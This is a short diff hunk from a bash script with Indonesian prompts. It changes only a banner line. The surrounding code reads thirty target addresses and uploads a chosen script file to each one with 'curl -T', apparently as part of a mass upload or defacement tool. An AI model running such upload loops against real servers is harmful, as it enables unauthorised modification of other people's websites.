@@ -1750,7 +1750,7 @@ echo -e $a ''
 read -p ' Target keduapuluh-sembilan : ' ke29
 echo -e $b ''
 read -p ' Target ketigapuluh : ' ke30
-echo '========[Proses]========' | lolcat
+echo -e $g '========[Proses]========'
 echo -e $c ''
 curl -T $alamat/$sc $ke1
 curl -T $alamat/$sc $ke2
